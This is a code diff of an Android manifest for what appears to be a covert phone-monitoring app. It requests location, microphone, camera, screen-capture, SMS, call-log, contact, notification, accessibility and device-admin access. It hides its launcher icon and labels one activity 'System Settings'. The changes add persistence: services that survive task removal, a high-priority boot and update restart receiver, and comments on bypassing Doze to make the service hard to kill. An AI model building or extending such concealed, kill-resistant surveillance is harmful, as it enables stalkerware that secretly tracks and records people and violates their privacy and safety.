@@ -1,24 +1,24 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
-    <!-- Network -->
+    <!-- ── Network ─────────────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.INTERNET"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
 
-    <!-- Location -->
+    <!-- ── Location ────────────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
 
-    <!-- Camera -->
+    <!-- ── Camera ──────────────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.CAMERA"/>
 
-    <!-- Audio / mic -->
+    <!-- ── Audio / mic ─────────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
 
-    <!-- Calls -->
+    <!-- ── Calls ───────────────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.READ_CALL_LOG"/>
     <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
@@ -26,26 +26,27 @@
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
     <uses-permission android:name="android.permission.CALL_PHONE"/>
 
-    <!-- SMS -->
+    <!-- ── SMS ─────────────────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.READ_SMS"/>
     <uses-permission android:name="android.permission.RECEIVE_SMS"/>
     <uses-permission android:name="android.permission.READ_MMS"/>
 
-    <!-- Contacts -->
+    <!-- ── Contacts ────────────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
 
-    <!-- Gallery / storage -->
+    <!-- ── Gallery / storage ───────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
 
-    <!-- App usage stats -->
+    <!-- ── App usage stats ─────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions"
         xmlns:tools="http://schemas.android.com/tools"/>
 
-    <!-- System / foreground -->
+    <!-- ── Foreground service (RESEARCH: All types must be declared here     -->
+    <!--    AND passed to startForeground() on Android 14+)                  -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
@@ -53,27 +54,34 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
 
-    <!-- Kill-proof -->
+    <!-- ── Kill-proof / Doze-safe ──────────────────────────────────────────── -->
+    <!-- RESEARCH (Doze): RECEIVE_BOOT_COMPLETED → restart after reboot       -->
+    <!-- RESEARCH (Doze): REQUEST_IGNORE_BATTERY_OPTIMIZATIONS → bypass Doze  -->
+    <!-- RESEARCH (Doze): WAKE_LOCK → CPU stays on in Doze for critical work  -->
+    <!-- RESEARCH (Android 16): SCHEDULE_EXACT_ALARM → Doze-safe watchdog    -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
     <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
 
-    <!-- Overlay — required for app blocking + live painting overlay -->
+    <!-- ── Overlay ─────────────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
 
-    <!-- Screen capture -->
+    <!-- ── Screen capture ──────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.MEDIA_CONTENT_CONTROL"/>
 
-    <!-- Notification -->
+    <!-- ── Notification ────────────────────────────────────────────────────── -->
+    <!-- RESEARCH: POST_NOTIFICATIONS required for foreground notification     -->
+    <!-- on Android 13+ — without this, foreground service notification         -->
+    <!-- is silently dropped, causing service to lose foreground priority       -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"/>
 
-    <!-- APK install -->
+    <!-- ── APK install ─────────────────────────────────────────────────────── -->
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
 
-    <!-- Shizuku -->
+    <!-- ── Shizuku ─────────────────────────────────────────────────────────── -->
     <queries>
         <package android:name="moe.shizuku.privileged.api"/>
         <package android:name="rikka.sui"/>
@@ -81,12 +89,13 @@
 
     <application
         android:allowBackup="false"
+        android:icon="@drawable/ic_logo"
         android:label="@string/app_name"
         android:description="@string/accessibility_desc"
         android:supportsRtl="true"
         android:theme="@style/Theme.App">
 
-        <!-- Setup activity (launcher icon — hidden via setComponentEnabledSetting) -->
+        <!-- Setup activity (launcher — hidden via setComponentEnabledSetting) -->
         <activity
             android:name=".setup.SetupActivity"
             android:exported="true"
@@ -98,8 +107,7 @@
             </intent-filter>
         </activity>
 
-        <!-- Activity-alias: alternate entry that can be disabled independently -->
-        <!-- When parent hides app: BOTH alias AND SetupActivity are disabled -->
+        <!-- Activity alias — disabled independently of SetupActivity -->
         <activity-alias
             android:name=".setup.SetupActivityAlias"
             android:targetActivity=".setup.SetupActivity"
@@ -119,43 +127,57 @@
             android:label="System Settings"
             android:theme="@style/Theme.App.Setup"/>
 
-        <!-- MediaProjection permission request — transparent -->
+        <!-- MediaProjection permission — transparent activity -->
         <activity
             android:name=".setup.MediaProjectionActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"
             android:exported="false"/>
 
-        <!-- Core service -->
+        <!--
+            Core service — RESEARCH FIX:
+            android:stopWithTask="false" ensures service survives task removal.
+            RESEARCH (Process Types): Foreground service has lowest OOM adj — hardest to kill.
+            foregroundServiceType must list ALL types used (Android 14+).
+        -->
         <service
             android:name=".core.CoreService"
             android:exported="false"
+            android:stopWithTask="false"
             android:foregroundServiceType="dataSync|location|microphone|camera"/>
 
         <!-- Audio stream service -->
         <service
             android:name=".monitors.AudioStreamService"
             android:exported="false"
+            android:stopWithTask="false"
             android:foregroundServiceType="microphone"/>
 
         <!-- Camera stream service -->
         <service
             android:name=".monitors.CameraStreamService"
             android:exported="false"
+            android:stopWithTask="false"
             android:foregroundServiceType="camera"/>
 
         <!-- Screen stream service -->
         <service
             android:name=".monitors.ScreenStreamService"
             android:exported="false"
+            android:stopWithTask="false"
             android:foregroundServiceType="mediaProjection"/>
 
-        <!-- Live Painting overlay service (blueprint: "Live Painting" feature) -->
+        <!-- Live Painting overlay service -->
         <service
             android:name=".monitors.LivePaintingService"
             android:exported="false"
+            android:stopWithTask="false"
             android:foregroundServiceType="dataSync"/>
 
-        <!-- Boot receiver -->
+        <!--
+            Boot receiver — RESEARCH (Doze / OEM):
+            priority="999" — fires before other apps.
+            android.intent.action.MY_PACKAGE_REPLACED — restarts after OTA update.
+        -->
         <receiver android:name=".core.BootReceiver" android:exported="true">
             <intent-filter android:priority="999">
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
@@ -165,10 +187,10 @@
             </intent-filter>
         </receiver>
 
-        <!-- Watchdog receiver -->
+        <!-- Watchdog alarm receiver — RESEARCH (Doze): fires with setExactAndAllowWhileIdle -->
         <receiver android:name=".core.WatchdogReceiver" android:exported="false"/>
 
-        <!-- Notification listener -->
+        <!-- Notification listener — RESEARCH (Notification Listener): must be exported -->
         <service
             android:name=".monitors.NotificationMonitor"
             android:exported="true"
@@ -178,7 +200,7 @@
             </intent-filter>
         </service>
 
-        <!-- Accessibility -->
+        <!-- Accessibility — RESEARCH (Accessibility): must be exported, correct permission -->
         <service
             android:name=".monitors.AccessibilityMonitor"
             android:exported="true"
@@ -191,7 +213,7 @@
                 android:resource="@xml/accessibility_config"/>
         </service>
 
-        <!-- Device admin -->
+        <!-- Device admin — RESEARCH (Device Admin): restrictions increased on modern Android -->
         <receiver
             android:name=".core.DeviceAdminReceiver"
             android:exported="true"
